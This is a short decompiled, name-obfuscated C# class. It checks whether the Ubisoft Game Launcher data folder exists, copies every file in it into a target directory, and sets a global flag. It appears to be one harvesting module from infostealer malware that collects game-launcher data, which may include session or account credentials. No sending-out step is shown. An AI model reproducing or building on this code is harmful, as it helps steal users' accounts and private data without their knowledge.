using System.IO;
using ns13;

namespace ns7;

internal sealed class Class30
{
	private static string string_0 = Path.Combine(Class56.string_4, "Ubisoft Game Launcher");

	public static bool smethod_0(string string_1)
	{
		if (!Directory.Exists(string_0))
		{
			return false;
		}
		Directory.CreateDirectory(string_1);
		string[] files = Directory.GetFiles(string_0);
		foreach (string text in files)
		{
			File.Copy(text, Path.Combine(string_1, Path.GetFileName(text)));
		}
		Class55.bool_2 = true;
		return true;
	}
}
